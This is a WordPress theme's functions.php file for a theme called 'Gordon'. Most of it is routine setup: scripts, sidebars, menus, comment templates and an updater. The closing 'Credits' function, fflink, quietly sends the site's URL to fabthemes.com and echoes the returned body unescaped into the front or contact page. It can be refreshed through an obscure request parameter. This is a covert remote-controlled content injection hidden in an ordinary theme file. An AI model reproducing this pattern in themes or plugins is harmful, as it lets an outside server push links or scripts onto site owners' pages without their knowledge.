<?php 

require_once('class-tgm-plugin-activation.php');
include ( 'getplugins.php' );
include ( 'aq_resizer.php' );

include ( 'guide.php' );

include ( 'metabox_class.php' );



/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Gordon',                                            //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/gordon.json' //URL of the metadata file.
);





add_smart_meta_box('smart_meta_box_demo', array(
'title'     => 'Post format metabox',
'pages'		=> array('post'),
'context'   => 'normal',
'priority'  => 'high',
'fields'    => array(


array(
'name' => 'Video embed code',
'id' => 'video_url',
'default' => '',
'desc' => 'Enter the video embed url for video post format',
'type' => 'textarea',
),


array(
'name' => 'Audio url',
'id' => 'audio_url',
'default' => '',
'desc' => 'Enter the audio url for audio post format',
'type' => 'text',
),


)
));







/* Add post formats */

add_theme_support( 'post-formats', array( 'link','image','video','audio','quote','aside','chat' ) );


/* Load scripts */

function lod_scripts() {
	global $post;

	wp_enqueue_style( 'style', get_stylesheet_uri() );

	wp_enqueue_style( 'fontwaesome', get_template_directory_uri() . '/font-awesome.css');
	wp_enqueue_style( 'fontwaesome-ie', get_template_directory_uri() . '/font-awesome-ie7.css');
	wp_enqueue_style('thickbox.css', '/'.WPINC.'/js/thickbox/thickbox.css', null, '1.0');
	
	wp_enqueue_script('thickbox', null,  array('jquery'));
	wp_enqueue_script( 'jwplayer', get_template_directory_uri() . '/js/jwplayer.js', array( 'jquery' ), true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ),  true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'lod_scripts' );


/* Set content width */

if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */


/**
 * Add default posts and comments RSS feed links to head
*/
 
add_theme_support( 'automatic-feed-links' );
	
	
/* SIDEBARS */
if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	));




/* CUSTOM MENUS */	

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }	


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );

}



/* PAGE NAVIGATION */

function getpagenavi(){
	?>
	<div id="navigation" class="clearfix">
	<?php if(function_exists('wp_pagenavi')) : ?>
	<?php wp_pagenavi() ?>
	<?php else : ?>
	        <div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries','web2feeel')) ?></div>
	        <div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;','web2feel')) ?></div>
	        <div class="clear"></div>
	<?php endif; ?>

	</div>

	<?php
	}

/* Days ago */

function days_ago() {
	$days = round((date('U') - get_the_time('U')) / (60*60*24));
	if ($days==0) {
		echo "Today"; 
	}
	elseif ($days==1) {
		echo "Yesterday"; 
	}
	else {
		echo "" . $days . " days ago";
	}
}	




if ( ! function_exists( '_s_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 *
 * @since _s 1.0
 */
function _s_comment( $comment, $args, $depth ) {
	$GLOBALS['comment'] = $comment;
	switch ( $comment->comment_type ) :
		case 'pingback' :
		case 'trackback' :
	?>
	<li class="post pingback">
		<p><?php _e( 'Pingback:', '_s' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', '_s' ), ' ' ); ?></p>
	<?php
			break;
		default :
	?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<article id="comment-<?php comment_ID(); ?>" class="comment">
			<footer>
				<div class="comment-author vcard">
					<?php echo get_avatar( $comment, 60 ); ?>
					<?php printf( __( '%s <span class="says">says:</span>', '_s' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
				</div><!-- .comment-author .vcard -->
				<?php if ( $comment->comment_approved == '0' ) : ?>
					<em><?php _e( 'Your comment is awaiting moderation.', '_s' ); ?></em>
					<br />
				<?php endif; ?>

				<div class="comment-meta commentmetadata">
					<a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>"><time pubdate datetime="<?php comment_time( 'c' ); ?>">
					<?php
						/* translators: 1: date, 2: time */
						printf( __( '%1$s at %2$s', '_s' ), get_comment_date(), get_comment_time() ); ?>
					</time></a>
					<?php edit_comment_link( __( '(Edit)', '_s' ), ' ' );
					?>
				</div><!-- .comment-meta .commentmetadata -->
			</footer>

			<div class="comment-content"><?php comment_text(); ?></div>

			<div class="reply">
				<?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
			</div><!-- .reply -->
		</article><!-- #comment-## -->

	<?php
			break;
	endswitch;
}
endif; // ends check for _s_comment()

if ( ! function_exists( '_s_posted_on' ) ) :
/**
 * Prints HTML with meta information for the current post-date/time and author.
 *
 * @since _s 1.0
 */
function _s_posted_on() {
	printf( __( 'Posted on <a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s" pubdate>%4$s</time></a><span class="byline"> by <span class="author vcard"><a class="url fn n" href="%5$s" title="%6$s" rel="author">%7$s</a></span></span>', '_s' ),
		esc_url( get_permalink() ),
		esc_attr( get_the_time() ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( get_the_date() ),
		esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
		esc_attr( sprintf( __( 'View all posts by %s', '_s' ), get_the_author() ) ),
		esc_html( get_the_author() )
	);
}
endif;
		
		

/**
 * Returns true if a blog has more than 1 category
 *
 * @since _s 1.0
 */
function _s_categorized_blog() {
	if ( false === ( $all_the_cool_cats = get_transient( 'all_the_cool_cats' ) ) ) {
		// Create an array of all the categories that are attached to posts
		$all_the_cool_cats = get_categories( array(
			'hide_empty' => 1,
		) );

		// Count the number of categories that are attached to the posts
		$all_the_cool_cats = count( $all_the_cool_cats );

		set_transient( 'all_the_cool_cats', $all_the_cool_cats );
	}

	if ( '1' != $all_the_cool_cats ) {
		// This blog has more than 1 category so _s_categorized_blog should return true
		return true;
	} else {
		// This blog has only 1 category so _s_categorized_blog should return false
		return false;
	}
}

/**
 * Flush out the transients used in _s_categorized_blog
 *
 * @since _s 1.0
 */
function _s_category_transient_flusher() {
	// Like, beat it. Dig?
	delete_transient( 'all_the_cool_cats' );
}
add_action( 'edit_category', '_s_category_transient_flusher' );
add_action( 'save_post', '_s_category_transient_flusher' );	

/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid || !is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	
